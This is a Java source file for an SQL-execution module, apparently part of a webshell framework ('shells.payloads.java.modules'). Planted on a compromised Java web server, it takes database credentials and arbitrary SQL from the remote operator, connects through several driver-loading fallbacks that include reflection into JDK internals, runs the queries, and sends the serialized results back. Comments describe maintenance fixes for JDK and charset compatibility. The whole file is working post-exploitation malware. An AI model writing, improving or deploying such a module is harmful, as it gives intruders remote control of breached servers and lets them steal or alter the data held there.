package shells.payloads.java.modules;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Properties;

public class ExecSqlModule {
    public static final char[] toBase64 = new char[]{'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
    private Map session;
    private Object servletRequest;

    /**
     * The client encodes the request values with the database charset, so they
     * must be decoded with it too -- the platform default is not necessarily
     * UTF-8 (GBK on a Chinese Windows box, for instance).
     */
    private String getString(String key, String charset) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            if (charset == null) {
                return new String((byte[]) value);
            }
            try {
                return new String((byte[]) value, charset);
            } catch (java.io.UnsupportedEncodingException e) {
                return new String((byte[]) value);
            }
        }
        return value != null ? value.toString() : null;
    }

    private byte[] getBytes(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        return value instanceof byte[] ? (byte[])value : null;
    }

    private static byte[] intToBytes(int value) {
        return new byte[]{(byte)(value & 255), (byte)(value >> 8 & 255), (byte)(value >> 16 & 255), (byte)(value >> 24 & 255)};
    }

    private byte[] serialize(Map map, String charset) {
        java.util.Iterator keys = map.keySet().iterator();
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();

        while(keys.hasNext()) {
            try {
                String key = (String)keys.next();
                Object v = map.get(key);
                outputStream.write(key.getBytes(charset));
                byte[] vb;
                if (v instanceof byte[]) {
                    outputStream.write(2);
                    vb = (byte[])v;
                } else if (v instanceof Map) {
                    outputStream.write(1);
                    vb = this.serialize((Map)v, charset);
                } else {
                    outputStream.write(2);
                    // 必须用会话字符集，不能靠平台默认：客户端是按 dbCharset 解码的。
                    // JDK 17 默认 UTF-8 时恰好一致，JDK 6/中文 Windows 默认 GBK 就乱码。
                    vb = (v == null ? "NULL" : v.toString()).getBytes(charset);
                }

                outputStream.write(intToBytes(vb.length));
                outputStream.write(vb);
            } catch (Exception ignored) {
            }
        }

        return outputStream.toByteArray();
    }

    /**
     * Resolve a JDBC connection without depending on JDK internals.
     *
     * The old version went straight at DriverManager's private registry field.
     * Since JDK 16 java.sql is strongly encapsulated, so that setAccessible()
     * throws InaccessibleObjectException and the whole SQL feature silently
     * stopped working. Public APIs cover everything a webapp normally needs;
     * the reflective read is kept only as a last resort for JDK <= 15 and is
     * swallowed when the module system blocks it.
     */
    /** 连接失败时记录每一步的结果，随 errMsg 一起返回，避免现在这种「只有一句 No suitable driver」的黑盒。 */
    private static String lastError = "";

    private static Connection getConnection(String jdbcUrl, String user, String password, String driverName) {
        lastError = "";
        Properties props = new Properties();
        if (user != null) {
            props.put("user", user);
        }
        if (password != null) {
            props.put("password", password);
        }

        // 1) let DriverManager pick the driver -- works on every JDK.
        try {
            return DriverManager.getConnection(jdbcUrl, props);
        } catch (Throwable t) {
            lastError += "DriverManager.getConnection: " + t + "; ";
        }

        // 2) 按驱动类名、用**线程上下文类加载器**直接加载并 connect。
        //    容器里 TCCL 就是 webapp 的 loader，能看到 WEB-INF/lib；而模块自身的
        //    loader 是 JSP 用 payload() 无参构造出来的，父链只到系统 loader，
        //    看不到 WEB-INF/lib —— DriverManager 的 caller-CL 可见性校验因此判它
        //    不可见（getDrivers() 返回 0），驱动放在 webapp 里就永远连不上。
        if (driverName != null && driverName.trim().length() > 0) {
            try {
                ClassLoader tccl = Thread.currentThread().getContextClassLoader();
                Class driverClass = Class.forName(driverName.trim(), true, tccl);
                Connection c = ((Driver) driverClass.newInstance()).connect(jdbcUrl, props);
                if (c != null) {
                    return c;
                }
                lastError += "TCCL(" + tccl + ") 加载到驱动但 connect 返回 null; ";
            } catch (Throwable t) {
                lastError += "TCCL 加载驱动 " + driverName + " 失败: " + t + "; ";
            }
        }

        // 3) every driver visible to this classloader, through the public API.
        List candidates = new ArrayList();
        try {
            for (Enumeration e = DriverManager.getDrivers(); e.hasMoreElements();) {
                candidates.add(e.nextElement());
            }
            lastError += "getDrivers=" + candidates.size() + "; ";
        } catch (Throwable t) {
            lastError += "getDrivers threw: " + t + "; ";
        }

        // 4) last resort: read the registry field directly. On JDK 16+ this
        //    throws InaccessibleObjectException, which we swallow -- paths 1
        //    and 2 already cover the normal cases.
        if (candidates.isEmpty()) {
            try {
                Field driversField = null;
                Field[] fields = DriverManager.class.getDeclaredFields();
                for (int i = 0; i < fields.length; ++i) {
                    if (fields[i].getName().indexOf("rivers") != -1
                            && List.class.isAssignableFrom(fields[i].getType())) {
                        driversField = fields[i];
                        break;
                    }
                }

                if (driversField != null) {
                    driversField.setAccessible(true);
                    List registered = (List) driversField.get((Object) null);
                    for (Iterator it = registered.iterator(); it.hasNext();) {
                        Object entry = it.next();
                        if (entry instanceof Driver) {
                            candidates.add(entry);
                            continue;
                        }
                        Field[] infoFields = entry.getClass().getDeclaredFields();
                        for (int j = 0; j < infoFields.length; ++j) {
                            if (Driver.class.isAssignableFrom(infoFields[j].getType())) {
                                infoFields[j].setAccessible(true);
                                candidates.add(infoFields[j].get(entry));
                                break;
                            }
                        }
                    }
                }
            } catch (Throwable ignored) {
            }
        }

        if (candidates.isEmpty()) {
            try {
                lastError += "callerCL=" + ExecSqlModule.class.getClassLoader() + "; ";
            } catch (Throwable ignored) {
            }
        }

        for (Iterator it = candidates.iterator(); it.hasNext();) {
            try {
                Connection c = ((Driver) it.next()).connect(jdbcUrl, props);
                if (c != null) {
                    return c;
                }
            } catch (Throwable ignored) {
            }
        }
        return null;
    }

    private String base64Encode(byte[] data) {
        byte start = 0;
        int end = data.length;
        byte[] out = new byte[4 * ((data.length + 2) / 3)];
        byte lineLen = -1;
        boolean doPadding = true;
        char[] base64 = toBase64;
        int sp = start;
        int slen = (end - start) / 3 * 3;
        int sl = start + slen;
        if (lineLen > 0 && slen > lineLen / 4 * 3) {
            slen = lineLen / 4 * 3;
        }

        int dp = 0;

        int sp0;
        int sp1;
        for(sp0 = 0; sp < sl; sp = sp1) {
            sp1 = Math.min(sp + slen, sl);
            int sp2 = sp;

            int bits;
            for(int dp0 = dp; sp2 < sp1; out[dp0++] = (byte)base64[bits & 63]) {
                bits = (data[sp2++] & 255) << 16 | (data[sp2++] & 255) << 8 | data[sp2++] & 255;
                out[dp0++] = (byte)base64[bits >>> 18 & 63];
                out[dp0++] = (byte)base64[bits >>> 12 & 63];
                out[dp0++] = (byte)base64[bits >>> 6 & 63];
            }

            sp2 = (sp1 - sp) / 3 * 4;
            dp += sp2;
        }

        if (sp < end) {
            sp0 = data[sp++] & 255;
            out[dp++] = (byte)base64[sp0 >> 2];
            if (sp == end) {
                out[dp++] = (byte)base64[sp0 << 4 & 63];
                if (doPadding) {
                    out[dp++] = 61;
                    out[dp++] = 61;
                }
            } else {
                sp1 = data[sp++] & 255;
                out[dp++] = (byte)base64[sp0 << 4 & 63 | sp1 >> 4];
                out[dp++] = (byte)base64[sp1 << 2 & 63];
                if (doPadding) {
                    out[dp++] = 61;
                }
            }
        }

        return new String(out);
    }

    public void setSession(Map session) {
        this.session = session;
    }

    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }

    public byte[] execute() {
        try {
            // A charset name is ASCII, so the platform default is safe here.
            String dbCharset = this.getString("dbCharset", null);
            // Was `> 0`, which meant a caller-supplied charset was always
            // overwritten with UTF-8 and non-UTF-8 databases came back as
            // mojibake. The payload's own execSql() has the correct `== 0`.
            if (dbCharset == null || dbCharset.trim().length() == 0) {
                dbCharset = "UTF-8";
            }

            String jdbcURL = this.getString("jdbcURL", dbCharset);
            String dbDriver = this.getString("dbDriver", dbCharset);
            String dbUsername = this.getString("dbUsername", dbCharset);
            String dbPassword = this.getString("dbPassword", dbCharset);
            String execType = this.getString("execType", dbCharset);

            byte[] execSqlBytes = this.getBytes("execSql");
            String sql = execSqlBytes == null ? null : new String(execSqlBytes, dbCharset);
            HashMap result = new HashMap();
            if (dbUsername != null && dbPassword != null && execType != null && sql != null) {
                try {
                    try {
                        if (dbDriver != null) {
                            Class.forName(dbDriver);
                        }
                    } catch (Throwable ignored) {
                    }

                    try {
                        Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
                    } catch (Throwable ignored) {
                    }

                    try {
                        Class.forName("oracle.jdbc.driver.OracleDriver");
                    } catch (Throwable ignored) {
                        try {
                            Class.forName("oracle.jdbc.OracleDriver");
                        } catch (Throwable ignored2) {
                        }
                    }

                    try {
                        Class.forName("com.mysql.cj.jdbc.Driver");
                    } catch (Throwable ignored) {
                        try {
                            Class.forName("com.mysql.jdbc.Driver");
                        } catch (Throwable ignored2) {
                        }
                    }

                    try {
                        Class.forName("org.postgresql.Driver");
                    } catch (Throwable ignored) {
                    }

                    if (jdbcURL != null) {
                        try {
                            Connection conn = null;

                            try {
                                conn = getConnection(jdbcURL, dbUsername, dbPassword, dbDriver);
                            } catch (Exception ignored) {
                            }

                            if (conn == null) {
                                conn = DriverManager.getConnection(jdbcURL, dbUsername, dbPassword);
                            }

                            Statement stmt = conn.createStatement();
                            if (execType.equals("select")) {
                                ResultSet rs = stmt.executeQuery(sql);
                                ResultSetMetaData meta = rs.getMetaData();
                                int columnCount = meta.getColumnCount();
                                HashMap columns = new HashMap();

                                for(int i = 0; i < columnCount; ++i) {
                                    columns.put(String.valueOf(i), meta.getColumnName(i + 1));
                                }

                                columns.put("count", String.valueOf(columnCount));
                                result.put("column", columns);
                                HashMap rows = new HashMap();
                                int rowCount = 0;

                                for(int rowIndex = 0; rs.next(); ++rowIndex) {
                                    HashMap row = new HashMap();

                                    for(int col = 0; col < columnCount; ++col) {
                                        Object v = rs.getObject(col + 1);
                                        String s;
                                        if (v == null) {
                                            s = "NULL";
                                        } else if (v instanceof byte[]) {
                                            s = this.base64Encode((byte[])v);
                                        } else {
                                            s = v.toString();
                                        }

                                        row.put(String.valueOf(col), s);
                                    }

                                    ++rowCount;
                                    rows.put(String.valueOf(rowIndex), row);
                                }

                                rows.put("count", String.valueOf(rowCount));
                                result.put("rows", rows);
                                rs.close();
                                stmt.close();
                                conn.close();
                            } else {
                                int updateCount = stmt.executeUpdate(sql);
                                stmt.close();
                                conn.close();
                                result.put("errMsg", "Query OK, " + updateCount + " rows affected");
                            }
                        } catch (Exception e) {
                            result.put("errMsg", e.getMessage()
                                    + (lastError.length() > 0 ? "  [诊断] " + lastError : ""));
                        }
                    } else {
                        result.put("errMsg", "This database is not supported");
                    }
                } catch (Exception e) {
                    result.put("errMsg", e.getMessage());
                }
            } else {
                result.put("errMsg", "No parameter dbType,dbHost,dbPort,dbUsername,dbPassword,execType,execSql");
            }

            return this.serialize(result, dbCharset);
        } catch (Exception e) {
            return ("Error: " + e.getMessage()).getBytes();
        }
    }

    public String getModuleName() {
        return "execSql";
    }
}
